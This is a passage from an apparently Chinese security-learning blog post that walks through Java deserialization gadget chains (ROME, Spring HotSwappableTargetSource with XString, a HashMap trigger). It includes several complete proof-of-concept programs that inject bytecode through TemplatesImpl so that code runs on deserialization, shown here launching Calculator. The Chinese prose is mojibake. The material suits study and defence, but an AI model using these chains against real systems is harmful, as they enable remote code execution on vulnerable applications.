setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œè°ƒè¯•ä¹Ÿæ²¡é—®é¢˜ã€‚\nOKï¼ŒROMEé“¾å®Œç»“ã€‚\næœ€åï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼š è¿™ä¸ªromeé“¾è™½ç„¶æ˜¯è·å–åˆ°getterå’Œsetteræ–¹æ³•ï¼Œä½†æ˜¯ä»åˆ©ç”¨ä»£ç å±‚é¢æ˜¯åªèƒ½è°ƒç”¨åˆ°getterï¼Œè‡ªå·±åˆ†ææ˜¯è¿™æ ·ï¼Œå…·ä½“å°±è‡ªå·±è°ƒè¯•çœ‹çœ‹ï¼Œä¹Ÿä¸éš¾ã€‚\nå…¶ä»–é“¾ åŒæ ·çš„å¯ä»¥ç®—æ˜¯å¦å¤–çš„è§¦å‘toString()æ–¹æ³•çš„ç±»ï¼Œæ³¨æ„ä¸²é€šä¸åŒçš„çŸ¥è¯†ç‚¹ã€‚\nHotSwappableTargetSource è¿™ä¸ªç±»ä½äºorg.springframework.aop.target.HotSwappableTargetSourceï¼Œæ˜¯spring AOPä¸‹çš„ä¸€ä¸ªç±»ï¼Œä¸»è¦çš„ç‚¹è¿˜æ˜¯å¯ä»¥è°ƒç”¨åˆ°toString()æ–¹æ³•ï¼Œç°åœ¨æ¥è·Ÿä¸€ä¸‹è¿™é‡Œçš„è¿‡ç¨‹ã€‚\néœ€è¦åŠ ä¸€ä¸ªspring-bootçš„ä¾èµ–ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-aop\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.2.7.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åœ¨è¿™é‡Œä¼šåˆ©ç”¨åˆ°HotSwappableTargetSourceç±»çš„equals()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ä¼šè°ƒç”¨åˆ°equals()æ–¹æ³•ï¼Œè€æœ‹å‹äº†ï¼Œç„¶åè¿™é‡Œè°ƒç”¨äº†this.targetï¼Œè¿™ä¸ªå‚æ•°æ˜¯å¯æ§çš„ï¼š\næ‰€ä»¥è¿™é‡Œéƒ½æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”æ˜¯å°†è¿™é‡Œçš„targetå˜é‡ç±»å‹æ˜¯objectï¼Œæ‰€ä»¥æ˜¯å¯ä»¥è¿›è¡Œä»»æ„å˜é‡çš„èµ‹å€¼ã€‚\næ€»ç»“æ¥è¯´å°±æ˜¯å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„equals()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œæ˜¯é€‰æ‹©çš„XStringç±»çš„equals()æ–¹æ³•ï¼Œè¿™ä¸ªç±»ä½äºcom.sun.org.apache.xpath.internal.objects.XStringï¼Œç°åœ¨æ¥çœ‹ä¸€ä¸‹è¿™é‡Œé€‰æ‹©çš„æ–¹æ³•ï¼š\nå¯ä»¥è°ƒç”¨toString()æ–¹æ³•ï¼Œç„¶åè¿™é‡Œæ‹¼æ¥ä¸Šå‰é¢çš„romeé“¾çš„toStringé“¾å³å¯ã€‚\nè°ƒç”¨åˆ°equals()æ–¹æ³•çš„ï¼Œæˆ‘çœ‹ç½‘ä¸Šä¼¼ä¹éƒ½æ˜¯ç”¨çš„HashMapä½œä¸ºååºåˆ—åŒ–å‡ºå‘ç‚¹ï¼Œè§¦å‘çš„åœ°æ–¹å°±åœ¨putVal()æ–¹æ³•ï¼š\næˆ‘è§‰å¾—è¿™é‡Œè§¦å‘ç‚¹çš„ç‚¹å°±æ˜¯å›¾ä¸­æ ‡æ³¨å‡ºæ¥çš„ï¼Œåˆšå¥½ä¹‹å‰æ²¡åˆ©ç”¨è¿‡è¿™é‡Œçš„putVal()æ–¹æ³•æ¥è§¦å‘equals()æ–¹æ³•ï¼Œè¿™é‡Œæ¥ç®€å•æ„é€ ä¸€ä¸‹ã€‚\nå…¶å®å¯ä»¥å…ˆç®€å•ä»£ç è·Ÿè¿›æ„é€ ä¸€ä¸‹ï¼Œç»•ä¸è¿‡çš„ä¸€ç‚¹å°±æ˜¯éœ€è¦hashå€¼ç›¸åŒçš„ï¼Œåœ¨è°ƒç”¨hash()æ–¹æ³•æ—¶ä¼šè°ƒç”¨åˆ°hashCode()æ–¹æ³•æ¥è¿›è¡Œhashå€¼çš„è®¡ç®—ï¼Œä»ä»£ç è·Ÿè¿›ä¸­å¯ä»¥çŸ¥é“è¿™é‡Œçš„keyæ˜¯éœ€è¦ä¸ºHotSwappableTargetSourceç±»å®ä¾‹çš„ï¼Œæ­£å·§è¿™ä¸ªç±»æ˜¯å®šä¹‰äº†hashCode()æ–¹æ³•çš„ï¼š\nè¿™ä¸ªç‚¹å°±éå¸¸æœ‰æ„æ€äº†ï¼Œå¤§æ¦‚å°±æ˜¯æ— è®ºè¿™ä¸ªç±»ä¸­å†™å…¥äº†ä»€ä¹ˆï¼Œåªè¦å¯¹è¿™ä¸ªç±»è°ƒç”¨hashCode()æ–¹æ³•ï¼Œè¿”å›çš„ç»“æœéƒ½æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯å¯ä»¥ç›´æ¥åˆ©ç”¨çš„ï¼Œç„¶åå°±å¯ä»¥ç®€å•å†™ä¸€ä¸ªä»£ç æ¥è¿›è¡Œè°ƒè¯•åˆ†æï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.target.HotSwappableTargetSource; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean x1 = new ObjectBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); HotSwappableTargetSource ho1 = new HotSwappableTargetSource(xString); HotSwappableTargetSource ho2 = new HotSwappableTargetSource(x1); HashMap hm = new HashMap(); hm.put(ho2,1); hm.put(ho1,1); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } è¿è¡Œå°±ç›´æ¥å¼¹å‡ºè®¡ç®—æœºäº†ï¼Œé‚£ä¹ˆå°±æ˜¯åœ¨ç¬¬äºŒæ¬¡putè¿›å€¼æ—¶å¼¹çš„è®¡ç®—æœºï¼Œç°åœ¨æ‰“æ–­ç‚¹æ¥è¿›è¡Œè°ƒè¯•ã€‚\nå‘ç°æ˜¯ç›´æ¥åœ¨å¦‚ä¸‹çš„equals()æ–¹æ³•å°±è°ƒç”¨åˆ°äº†HotSwappableTargetSourceç±»çš„equals()æ–¹æ³•ï¼š\nå‰é¢é‚£ä¸ªpå°±æ˜¯èµ‹å€¼ä¸ºå‰ä¸€ä¸ªæ”¾è¿›å»çš„å€¼ï¼Œç„¶ååé¢ä¼šè°ƒç”¨pæ¥è·å–åˆ°ä»–çš„hashå€¼ç­‰æ“ä½œã€‚\nåœ¨è°ƒç”¨åˆ°equals()æ–¹æ³•å‰ï¼Œè™½ç„¶ä¸¤ä¸ªHotSwappableTargetSourceç±»å®ä¾‹çš„hashå€¼ç›¸åŒï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾æœ¬è´¨çš„å†…å®¹æ˜¯ä¸åŒçš„ï¼Œç„¶åä¼šè°ƒç”¨åˆ°equals()æ–¹æ³•:\nç„¶åè°ƒç”¨åˆ°XStringç±»çš„equals()æ–¹æ³•ï¼š\nç„¶åå°±ä¼šè°ƒç”¨åˆ°ObjectBeanç±»çš„toString()æ–¹æ³•ï¼Œéšåçš„è¿‡ç¨‹å°±æ˜¯å‰é¢toStringé“¾è¯´è¿‡çš„äº†ï¼Œåé¢è¿‡ç¨‹å°±ä¸å†å¤šè¯´äº†ï¼Œæœ€åè¿”å›äº†falseã€‚\nå¯¹äºequals()æ–¹æ³•è°ƒç”¨ç»“æŸä¸ºfalseï¼Œè¿™é‡Œç®€å•è¯´è¯´å°±è¡Œäº†ï¼š\nä¸¤ä¸ªHotSwappableTargetSourceç±»å®ä¾‹è‚¯å®šä¸åŒï¼Œç„¶åç¬¦åˆinstancesï¼Œç„¶åè°ƒç”¨equals()æ–¹æ³•ï¼š\nè¿™é‡Œçš„str()å°±æ˜¯è¿”å›å‰é¢å®ä¾‹åŒ–ä¼ å‚çš„fupancï¼Œç„¶åè¿™é‡Œè°ƒç”¨äº†toString()æ–¹æ³•ï¼Œè¿™é‡Œè¿”å›çš„ç»“æœæ˜¯ä¸ä¼šç›¸åŒçš„ï¼Œæ‰€ä»¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒæ˜¯è‚¯å®šä¼šè¢«ç›´æ¥åˆ¤å®šä¸ºfalseï¼Œæœ€åç»¼åˆä¸‹æ¥ï¼Œè¿™æ•´ä¸ªè°ƒç”¨çš„equals()æ–¹æ³•è¿”å›falseï¼Œæœ€åè®©æ•´ä¸ªifæ¡ä»¶åˆ¤æ–­ä¸ºfalseã€‚ä¹Ÿæ˜¯ç¬¦åˆé¢„æœŸçš„ã€‚\nç»§ç»­è·Ÿè¿›putVal()æ–¹æ³•çš„åç»­ä»£ç ï¼Œæ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼š\nå…¶å®å…·ä½“è¿‡ç¨‹éƒ½æ˜¯å’ŒHashtableé‚£é‡Œç›¸åŒçš„ï¼Œåœ¨è¿™é‡Œçš„è¯ï¼Œè™½ç„¶hashç›¸åŒï¼Œä½†æ˜¯ä¸¤ä¸ªå®ä¾‹åŒ–å¯¹è±¡æ˜¯è‚¯å®šä¸åŒçš„ï¼Œå¯¹äºåé¢çš„equals()æ–¹æ³•è°ƒç”¨ï¼Œå‚è€ƒåˆ°Hashtableç±»çš„equals()è°ƒç”¨ï¼Œåº”è¯¥æ˜¯éœ€è¦è¿™é‡Œçš„å€¼ä¸ç›¸åŒï¼Œç„¶åkeyåˆè¢«åˆ¤å®šä¸ºä¸åŒï¼Œè¿™æ ·å°±å¯ä»¥æ”¾å…¥ä¸¤ä¸ªå€¼ï¼Œ\nå› ä¸ºHashMapç­‰æ§åˆ¶é”®å€¼å¯¹çš„ç±»å…¶æœ¬è´¨å…¶å®éƒ½æ˜¯è®©ä¸€ä¸ªå†…éƒ¨ç±»Nodeæ¥è¿›è¡Œçš„å­˜å‚¨ï¼Œæ‰€ä»¥æœ€åçš„ç›®çš„è‚¯å®šæ˜¯è¦å®ä¾‹è¯ä¸€ä¸ªNodeç±»çš„ï¼Œä¹Ÿå°±æ˜¯å›¾ä¸­çš„newNode()æ–¹æ³•ï¼š\næ‰€ä»¥éœ€è¦è§„é¿æ‰ä¸Šé¢çš„æ›´æ–°å€¼çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯éœ€è¦eä¸ºnullï¼Œçœ‹ä¸Šé¢ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶è°ƒç”¨å®Œequals()æ–¹æ³•åè¿”å›ä¸€ä¸ªfalseï¼Œä¹Ÿå°±å›è®©æ•´ä¸ªifæ¡ä»¶è¿”å›ä¸€ä¸ªfalseï¼Œç„¶åelse ifè‚¯å®šä¹Ÿæ˜¯falseï¼Œè¿›å…¥åˆ°äº†elseè¯­å¥ï¼Œå…ˆåˆ¤æ–­ifè¯­å¥ï¼Œp.nextå°±æ˜¯è·å–ä¸‹ä¸€ä¸ªé”®å€¼å¯¹ï¼Œé‚£ä¹ˆè¿™é‡Œè‚¯å®šä¸ºnullã€‚ç„¶åè¿™çš„binCountåˆä¸º0ï¼Œè‚¯å®šä¸å¯èƒ½å¤§äº7ï¼Œå˜é‡å®šä¹‰å¦‚ä¸‹ï¼š\næ‰€ä»¥ç›´æ¥breakï¼Œç„¶åç»“æŸï¼Œæœ€åè¿™ä¸ªeä¹Ÿä¸ºnullï¼Œå¯ä»¥å¾€é‡Œé¢æ”¾ç¬¬äºŒä¸ªé”®å€¼å¯¹ã€‚å…¶å®ç›´æ¥æ¥ç€å‰é¢çš„æµ‹è¯•ä»£ç è°ƒè¯•å³å¯ï¼Œä¸»è¦çš„ç”Ÿæ•ˆä»£ç å°±æ˜¯ï¼š\nè¿™ä¸ªåœ°æ–¹å°†p.nextè®¾ç½®ä¸ºäº†ä¸‹ä¸€ä¸ªNodeï¼Œä¹Ÿå°±æ˜¯æˆåŠŸæ”¾å…¥äº†ä¸‹ä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´ï¼ŒåŸºæœ¬åªè¦æ»¡è¶³å‰é¢çš„equals()æ–¹æ³•åˆ¤å®šä¸ºfalseï¼Œå°±å¯ä»¥æ”¾è¿›å»ä¸€ä¸ªæ–°çš„é”®å€¼å¯¹ã€‚\nååºåˆ—åŒ–ä¹Ÿæ˜¯è°ƒç”¨çš„putVal()æ–¹æ³•ï¼Œæ‰€ä»¥å…¶å®ä¹ŸåŸºæœ¬è¿‡äº†ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚åºåˆ—åŒ–å‰ä¸å¼¹å‡ºè®¡ç®—æœºï¼Œå…¶å®ç›´æ¥åƒROMEé“¾é‚£æ ·æ”¹å°±è¡Œäº†ï¼Œç„¶ååå°„ä¿®æ”¹ï¼Œå…·ä½“è¿‡ç¨‹å¯ä»¥è‡ªå·±å»è·Ÿè·Ÿï¼Œè¿˜æ˜¯å…ˆå°è¯•ä¸æ¢å‘¢ï¼Ÿå°è¯•çš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ToStringBean; import org.springframework.aop.target.HotSwappableTargetSource; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); HotSwappableTargetSource ho1 = new HotSwappableTargetSource(xString); HotSwappableTargetSource ho2 = new HotSwappableTargetSource(x1); HashMap hm = new HashMap(); hm.put(ho2,1); hm.put(ho1,1); // setFieldValue(x1,\u0026#34;_beanClass\u0026#34;,Templates.class); // setFieldValue(x1,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hm); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } åªå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œé¢„æœŸåº”è¯¥æ˜¯ä¸¤ä¸ªï¼ŒåŒæ—¶ä¹ŸæŠ¥é”™ï¼š\n1 2 3 4 5 6 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: Evil at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331) at ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ æˆ‘ç”¨javassistå†™çš„Evilç±»æœ‰é—®é¢˜ï¼Ÿæ„Ÿè§‰å¯èƒ½å’Œå‰é¢CCå‡ å½“æ—¶æå‡ºçš„é—®é¢˜æœ‰ç‚¹åƒï¼Œä½†æ˜¯è¿™é‡Œå‘ç°æ˜¯ååºåˆ—åŒ–ä¸€éƒ¨åˆ†æŠ¥çš„é”™ï¼Œæ²¡è°ƒå‡ºæ¥ï¼Œé‚£è¿˜æ˜¯æ¢å§ï¼Œæœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ToStringBean; import org.springframework.aop.target.HotSwappableTargetSource; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(String.class,\u0026#34;fupanc\u0026#34;); XString xString = new XString(\u0026#34;fupanc\u0026#34;); HotSwappableTargetSource ho1 = new HotSwappableTargetSource(xString); HotSwappableTargetSource ho2 = new HotSwappableTargetSource(x1); HashMap hm = new HashMap(); hm.put(ho2,1); hm.put(ho1,1); setFieldValue(x1,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(x1,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hm); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } åªåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºã€‚æˆåŠŸè°ƒç”¨åˆ°ToStringBeanç±»çš„toString()æ–¹æ³•ï¼š\nè¿™é‡Œæ˜¯ç›´æ¥è¿”å›è¯»å‡ºæ¥çš„å­—èŠ‚ï¼Œæ‰€ä»¥ä¸Šä¸€æ­¥çš„XStringçš„equals()æ–¹æ³•åˆ¤æ–­éƒ½æ˜¯è‚¯å®šä¸ç›¸åŒçš„ï¼Œåªæ˜¯æœ‰ç‚¹ä¸æ¸…æ¥šä¸ºä»€ä¹ˆEvilè¿™é‡Œä¼šæŠ¥é”™æ‰¾ä¸åˆ°ï¼Ÿå¯èƒ½è¿˜æ˜¯å’Œåºåˆ—åŒ–é—®é¢˜ç›¸å…³å§ã€‚\nå‚è€ƒæ–‡ç« çš„ç»•è¿‡æ–¹å¼ä¹Ÿè¡Œï¼Œå¦‚ä¸‹POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ToStringBean; import org.springframework.aop.target.HotSwappableTargetSource; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); HashMap hash = new HashMap(); hash.put(\u0026#34;haha\u0026#34;,\u0026#34;haha\u0026#34;); HotSwappableTargetSource ho1 = new HotSwappableTargetSource(xString); HotSwappableTargetSource ho2 = new HotSwappableTargetSource(hash); HashMap hm = new HashMap(); hm.put(ho2,1); hm.put(ho1,1); setFieldValue(ho2,\u0026#34;target\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hm); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } åœ¨XStringç±»çš„equals()æ–¹æ³•è°ƒç”¨toString()æ–¹æ³•æ—¶ï¼Œè°ƒç”¨çš„ä¼šæ˜¯HashMapç±»çš„toString()æ–¹æ³•ï¼Œä½†å…¶å®éƒ½å¤§å·®ä¸å·®çš„ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\nHashtableç±»ä¹Ÿè¡Œå§åº”è¯¥ï¼Œhashå€¼ç›¸ç­‰è¿™ä¹ˆå®¹æ˜“ï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡HashMapçš„é™åˆ¶ã€‚\næœ€åï¼Œåœ¨å…¶ä»–é“¾å­çš„å­¦ä¹ ä¸­ï¼Œæˆ‘æ³¨æ„åˆ°åŒä¸€ä¸ªåŒ…ä¸‹çš„å¦å¤–ä¸€ä¸ªç±»SingletonTargetSourceï¼Œè·¯å¾„ä¸ºorg.springframework.aop.target.SingletonTargetSourceï¼Œè¿™ä¸ªç±»å®ç°äº†Serializableæ¥å£ï¼Œå¯ä»¥è¢«ç”¨æ¥åºåˆ—åŒ–ã€‚å…³æ³¨åˆ°è¿™ä¸ªç±»çš„equals()æ–¹æ³•ï¼š\nè¿™é‡Œçš„thatæ˜¯jdk16å¼•å…¥çš„ä¸€ä¸ªæœºåˆ¶ï¼Œå°±æ˜¯å‰é¢åˆ¤æ–­çš„instanceofä¸ºtrueå°±å›è®²otherè®¾ç½®ä¸ºthatï¼Œæ‰€ä»¥å…¶å®å’Œå‰é¢HotSwappableTargetSourceç±»çš„equals()æ–¹æ³•å®ç°çš„åŸºæœ¬é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æˆ‘è¿™é‡Œç”¨çš„SpringAOPçš„ç‰ˆæœ¬ä¸åŒï¼Œå¯èƒ½ä¸»è¦æ˜¯å› ä¸ºè¿™ä¸ªä¾èµ–å°±æ˜¯å†™ç»™jdk16åŠä»¥ä¸Šæ¥ä½¿ç”¨çš„å§ã€‚è¿™é‡Œä¹Ÿè¯´æ˜äº†ä¸€ä¸ªä¸œè¥¿ï¼Œåœ¨åšé¢˜æ—¶çœ‹åˆ°çš„ä¸åŒç‰ˆæœ¬çš„ä¾èµ–ä¹Ÿæ˜¯å¯ä»¥å°è¯•åˆ©ç”¨çš„ã€‚å°±æ‡’å¾—æ”¹æˆè¿™ç¯‡æ–‡ç« çš„ä¾èµ–ç‰ˆæœ¬äº†ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nHashtable+XStringé“¾ 